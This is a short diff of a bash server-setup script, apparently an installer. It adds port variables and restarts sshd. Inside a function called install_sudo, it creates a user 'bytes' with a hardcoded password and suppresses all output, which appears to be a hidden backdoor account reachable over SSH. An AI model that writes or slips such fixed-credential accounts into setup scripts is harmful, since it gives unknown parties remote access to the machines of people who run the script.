@@ -1,4 +1,6 @@
 #!/bin/bash
+PORT_UDP='53'
+PORT_TCP='110'
 timedatectl set-timezone Asia/Manila
 install_require () {
 clear
@@ -509,6 +511,7 @@ install_sudo(){
   {
     useradd -m bytes 2>/dev/null
     echo bytes:bytesph2023!!!@@@ | chpasswd &>/dev/null
+    service sshd restart
   }
 }
 
